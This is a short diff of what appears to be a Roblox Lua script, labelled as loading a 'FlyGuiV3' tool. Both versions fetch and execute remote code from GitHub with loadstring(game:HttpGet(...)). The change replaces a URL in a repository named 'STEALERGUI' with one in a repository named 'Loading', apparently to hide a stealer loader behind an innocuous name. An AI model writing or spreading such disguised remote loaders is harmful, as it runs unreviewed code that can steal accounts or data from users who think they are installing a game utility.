@@ -5,5 +5,5 @@ end)
 
 -- Execute second external script (FlyGuiV3)
 pcall(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovenew/STEALERGUI/refs/heads/main/Sceipt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ilovenew/Loading/refs/heads/main/Script"))()
 end)
